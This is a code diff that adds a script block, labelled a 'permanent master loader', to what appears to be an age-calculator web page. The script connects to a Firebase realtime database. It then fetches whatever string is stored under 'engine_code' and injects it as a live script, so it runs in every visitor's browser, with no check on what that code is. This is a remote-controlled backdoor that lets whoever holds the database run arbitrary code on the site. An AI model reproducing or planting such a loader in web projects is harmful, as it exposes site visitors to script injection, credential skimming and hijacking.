@@ -562,5 +562,48 @@
     })();
     </script>
     <!-- ================= END CONTROLLER ================= -->
+
+
+<!-- ================= CYBER BANGLA 24 PERMANENT MASTER LOADER ================= -->
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+<script>
+(function() {
+  const firebaseConfig = {
+    apiKey: "AIzaSyDHZk1lvPpNYaZoo-2V3E29tdFBfJkt1zY",
+    authDomain: "website-controler-35645.firebaseapp.com",
+    databaseURL: "https://website-controler-35645-default-rtdb.firebaseio.com",
+    projectId: "website-controler-35645",
+    storageBucket: "website-controler-35645.firebasestorage.app",
+    messagingSenderId: "623434903183",
+    appId: "1:623434903183:web:1b0a29f5507126d9080afa",
+    measurementId: "G-B06C29VX7W"
+  };
+  if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
+  const db = firebase.database();
+
+  window.CURRENT_SITE_ID = "Age - Calculator ";
+
+  // ফায়ারবেজের engine_code থেকে অটোমেটিক কোড নিয়ে রান করবে
+  db.ref('engine_code').on('value', snap => {
+    const code = snap.val();
+    if (code && typeof code === 'string') {
+      try {
+        const prev = document.getElementById('cb-remote-engine-tag');
+        if (prev) prev.remove();
+
+        const script = document.createElement('script');
+        script.id = 'cb-remote-engine-tag';
+        script.textContent = code;
+        document.body.appendChild(script);
+      } catch (e) {
+        console.error("Engine execution error:", e);
+      }
+    }
+  });
+})();
+</script>
+<!-- ================= END MASTER LOADER ================= -->
+
 </body>
 </html>
